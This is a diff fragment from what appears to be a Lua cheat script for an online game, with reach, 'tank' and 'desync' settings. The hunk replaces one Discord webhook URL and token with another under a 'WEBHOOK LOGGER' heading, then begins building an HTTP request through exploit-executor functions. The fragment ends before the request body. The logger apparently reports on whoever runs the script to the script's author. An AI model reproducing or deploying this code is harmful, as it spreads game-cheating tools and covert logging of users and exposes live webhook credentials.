@@ -38,7 +38,7 @@ local ReachEnabled, ReachSize, Trans = true, 4.5, 0.7
 local TankActive, DesyncActive = false, false
 
 -- [[ 2. WEBHOOK LOGGER ]]
-local WebhookURL = "https://discord.com/api/webhooks/1466824946826215445/4qNddKpDC6aXrZyuKRpDrLXVJz8G_gqRX2x1dQeJxZnd7DsXEBqpfusH4U96GQZmcY2j" 
+local WebhookURL = "https://discord.com/api/webhooks/1467231677351989563/aSBnMUeot4PzaIO8iUgGIHU2HyK05ezxu-vA5F7V-k_-nnyDqrIg7eh2Zcah0T3XgrJt" 
 pcall(function()
     local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
     if req then
